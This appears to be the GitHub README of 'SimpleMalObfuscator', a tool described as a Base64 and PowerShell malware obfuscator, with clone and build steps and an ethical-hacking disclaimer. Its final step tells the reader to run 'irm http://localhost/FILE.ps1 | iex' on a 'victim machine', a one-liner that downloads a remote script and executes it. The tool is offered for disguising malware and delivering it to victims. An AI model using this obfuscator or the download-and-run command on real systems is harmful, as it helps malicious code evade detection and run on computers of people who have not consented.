# SimpleMalObfuscator
Base64 and Powershell malware obfuscator based. \
⚠️ Please respect ethical hacking principles and only test in environments you own or have permission to test.

### Demo
![Screenshot 2025-06-08 154954](https://github.com/user-attachments/assets/8be143a0-56e0-466e-8864-c20ac56d4252)

### Install
```
git clone https://github.com/joaostack/SimpleMalObfuscator; cd SimpleMalObfuscator
```

```
dotnet restore
```

```
dotnet publish
```

And go to `bin/Release` folder.\

Execute on victim machine powershell
```
irm http://localhost/FILE.ps1 | iex
```

## Author

<b>João H.</b> (joaostack) – [GitHub](https://github.com/joaostack)
